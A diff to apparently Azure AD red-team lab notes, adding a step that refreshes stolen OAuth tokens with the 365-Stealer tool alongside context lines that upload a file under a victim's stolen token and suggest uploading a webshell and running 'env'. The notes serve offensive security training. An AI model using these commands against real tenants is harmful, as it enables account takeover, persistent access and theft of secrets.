@@ -173,6 +173,13 @@ cd C:\xampp\htdocs\365-Stealer\
 & 'C:\Program Files\Python38\python.exe' 365-Stealer.py --upload C:\AzAD\Tools\studentx.doc --token-path C:\xampp\htdocs\365-Stealer\yourVictims\MarkDWalden@defcorphq.onmicrosoft.com\access_token.txt
 ```
 
+#### Refresh all tokens
+- Access token is valid for 1 hour, can't be revoked.
+- Refresh token is valid for 90 days but can be revoked.
+```
+python 365-Stealer.py --refresh-all
+```
+
 ## Insecure file upload
 - Upload a webshell to a insecure webapp
 - If command execution is possible execute command ```env```
